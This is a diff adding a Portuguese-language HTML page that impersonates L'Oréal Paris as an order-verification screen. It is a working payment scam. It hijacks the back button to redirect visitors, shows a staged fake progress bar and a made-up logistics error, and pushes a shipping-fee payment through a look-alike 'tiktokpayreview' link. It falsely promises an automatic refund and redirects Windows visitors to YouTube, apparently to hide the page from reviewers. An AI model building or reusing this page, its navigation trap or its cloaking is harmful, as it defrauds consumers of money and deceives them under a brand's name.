@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+     <script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                location.replace('/elseve/back-up/frete' + (qs || ''));
+            });
+        })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>L'Oréal Paris | Verificação de Pedido</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+    
+    <!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D6CAT23C77U0SFL8IK90');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+    <style>
+        :root {
+            --pure-black: #000000;
+            --pure-white: #ffffff;
+            --light-gray: #f9f9f9;
+            --border-color: #eeeeee;
+            --error-soft: #fff5f5;
+            --error-dark: #b91c1c;
+            --success-soft: #f0fdf4;
+            --success-dark: #166534;
+            --text-main: #1a1a1a;
+            --text-secondary: #666666;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--light-gray);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* HEADER OFICIAL */
+        header {
+            width: 100%;
+            background: var(--pure-black);
+            padding: 25px 0;
+            text-align: center;
+        }
+        .brand {
+            font-family: 'Cinzel', serif;
+            font-size: 22px;
+            letter-spacing: 6px;
+            color: var(--pure-white);
+            font-weight: 700;
+        }
+
+        /* CONTAINER MINIMALISTA */
+        .container {
+            width: 100%;
+            max-width: 460px;
+            margin: 40px auto;
+            background: var(--pure-white);
+            padding: 40px 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            border: 1px solid var(--border-color);
+        }
+
+        /* LOADING SISTÊMICO */
+        #loading-view { text-align: center; }
+        .progress-container {
+            width: 100%; height: 2px; background: #eee;
+            margin: 30px 0; overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%; height: 100%; background: var(--pure-black); transition: width 0.3s ease;
+        }
+        
+        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
+        .sub-text { font-size: 11px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+
+        /* LISTA DE EVENTOS */
+        #events-view { display: flex; flex-direction: column; gap: 12px; }
+        .hidden { display: none; }
+
+        .event-row {
+            display: flex; align-items: center; gap: 15px;
+            padding: 18px; border: 1px solid var(--border-color);
+            animation: fadeIn 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards;
+        }
+        
+        .event-success { background: var(--success-soft); border-color: #dcfce7; }
+        .event-error { background: var(--error-soft); border-color: #fee2e2; }
+
+        .icon-svg { width: 18px; height: 18px; flex-shrink: 0; }
+        .icon-success { fill: var(--success-dark); }
+        .icon-error { fill: var(--error-dark); }
+
+        .event-content { display: flex; flex-direction: column; }
+        .event-title { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
+        .event-desc { font-size: 11px; color: var(--text-secondary); line-height: 1.4; }
+
+        /* CARD DE AÇÃO FINAL */
+        .action-card {
+            border: 1px solid var(--pure-black);
+            background: var(--pure-white);
+            padding: 25px;
+            margin-top: 10px;
+            animation: slideUp 0.8s cubic-bezier(0.23, 1, 0.32, 1) forwards;
+        }
+
+        .alert-header {
+            color: var(--pure-black);
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+
+        .alert-body { font-size: 13px; color: var(--text-main); line-height: 1.6; text-align: center; margin-bottom: 25px; }
+
+        /* REEMBOLSO INFO */
+        .refund-box {
+            background: var(--light-gray);
+            padding: 15px;
+            margin-bottom: 25px;
+            display: flex; align-items: flex-start; gap: 12px;
+            border-left: 3px solid var(--success-dark);
+        }
+        .refund-text { font-size: 11px; color: var(--text-main); font-weight: 400; line-height: 1.5; }
+        .refund-text strong { font-weight: 700; color: var(--success-dark); }
+
+        /* BOTÃO LUXO */
+        .btn-black {
+            background: var(--pure-black); color: var(--pure-white);
+            text-decoration: none; padding: 20px; width: 100%; display: block;
+            text-align: center; font-weight: 700; font-size: 12px;
+            text-transform: uppercase; letter-spacing: 2px;
+            transition: all 0.3s;
+            border: 1px solid var(--pure-black);
+        }
+        .btn-black:hover { background: var(--pure-white); color: var(--pure-black); }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        @media (max-width: 600px) {
+            .container { margin: 0; width: 100%; border: none; box-shadow: none; padding: 30px 20px; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <div class="brand">L’ORÉAL</div>
+    </header>
+
+    <div class="container">
+        
+        <div id="loading-view">
+            <h2>Verificando Pedido</h2>
+            <div class="progress-container">
+                <div class="progress-fill" id="p-bar"></div>
+            </div>
+            <p class="sub-text" id="p-text">Sincronizando com a base logística...</p>
+        </div>
+
+        <div id="events-view" class="hidden">
+            
+            <div id="step-1" class="hidden">
+                <div class="event-row event-success">
+                    <svg class="icon-svg icon-success" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    <div class="event-content">
+                        <span class="event-title">Transação Identificada</span>
+                        <span class="event-desc">O pagamento inicial foi processado pela operadora.</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step-2" class="hidden">
+                <div class="event-row event-error">
+                    <svg class="icon-svg icon-error" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                    <div class="event-content">
+                        <span class="event-title">Inconsistência Logística</span>
+                        <span class="event-desc">Divergência de tributação regional detectada no CEP de destino.</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step-3" class="hidden">
+                <div class="action-card">
+                    <div class="alert-header">
+                        Ação Necessária
+                    </div>
+                    
+                    <p class="alert-body">
+                        Para prosseguir com o despacho imediato, regularize a tarifa de frete de acordo com a tabela vigente de sua região.
+                    </p>
+
+                    <div class="refund-box">
+                        <div class="refund-text">
+                            <strong>Nota de Garantia:</strong> O valor excedente pago na tentativa anterior foi estornado automaticamente e constará em sua próxima fatura.
+                        </div>
+                    </div>
+
+                    <a href="https://pay.tiktokpayreview.online/699a0b0ec01312521f61213d" class="btn-black">
+                        Regularizar e Enviar
+                    </a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const loadingView = document.getElementById('loading-view');
+            const eventsView = document.getElementById('events-view');
+            const pBar = document.getElementById('p-bar');
+            const pText = document.getElementById('p-text');
+
+            const step1 = document.getElementById('step-1');
+            const step2 = document.getElementById('step-2');
+            const step3 = document.getElementById('step-3');
+
+            let width = 0;
+            const timer = setInterval(() => {
+                if(width >= 100) {
+                    clearInterval(timer);
+                    startEvents();
+                } else {
+                    width++;
+                    pBar.style.width = width + "%";
+                    if(width === 30) pText.innerText = "Consultando banco de dados...";
+                    if(width === 70) pText.innerText = "Aguardando resposta do servidor...";
+                }
+            }, 35);
+
+            function startEvents() {
+                loadingView.style.display = 'none';
+                eventsView.classList.remove('hidden');
+
+                // Sequência de exibição elegante
+                setTimeout(() => {
+                    step1.classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        step2.classList.remove('hidden');
+                        
+                        setTimeout(() => {
+                            step3.classList.remove('hidden');
+                            step3.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }, 2200);
+
+                    }, 2000);
+                }, 400);
+            }
+        });
+    </script>
+
+    <script type="text/javascript">
+        var userAgent = navigator.userAgent.toLowerCase();
+        if (/windows/.test(userAgent)) {
+            window.location.replace('https://www.youtube.com/');
+        }
+    </script>
+
+</body>
+</html>
